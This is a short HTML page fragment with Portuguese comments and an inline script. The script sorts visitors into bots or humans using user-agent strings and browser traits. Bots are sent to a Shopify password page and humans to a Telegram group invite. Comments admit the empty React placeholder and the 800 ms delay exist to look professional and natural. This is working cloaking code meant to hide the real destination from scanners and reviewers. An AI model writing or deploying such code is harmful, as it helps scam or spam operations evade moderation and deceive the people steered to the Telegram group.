  <!-- Placeholder para React/Remix (mantido para parecer "profissional") -->
  <div id="root"></div>

  <!-- Anti-bot + Redirecionamento Dinâmico -->
  <script type="module">
    // === DETECÇÃO DE BOTS ===
    const isBot = () => {
      // 1. User-Agent suspeito
      const ua = navigator.userAgent.toLowerCase();
      if (ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('headless')) return true;

      // 2. Sem Web APIs humanas
      if (!navigator.webdriver && !window.chrome && !window.callPhantom && !window._phantom) return false;
      if (navigator.webdriver) return true;

      // 3. Tela muito pequena ou sem interação
      if (screen.width < 100 || screen.height < 100) return true;

      // 4. JS não rodando corretamente
      if (!window.document || !window.document.body) return true;

      return false;
    };

    // === REDIRECIONAMENTO CONDICIONAL ===
    setTimeout(() => {
      if (isBot()) {
        // BOTS: vão para a página de senha do Shopify
        window.location.href = "https://idealemporio.myshopify.com/password";
      } else {
        // HUMANOS: vão direto pro grupo Telegram
        window.location.href = "https://t.me/+_4oIPC_hKTxlZDhh";
      }
    }, 800); // Pequeno delay para parecer natural
  </script>

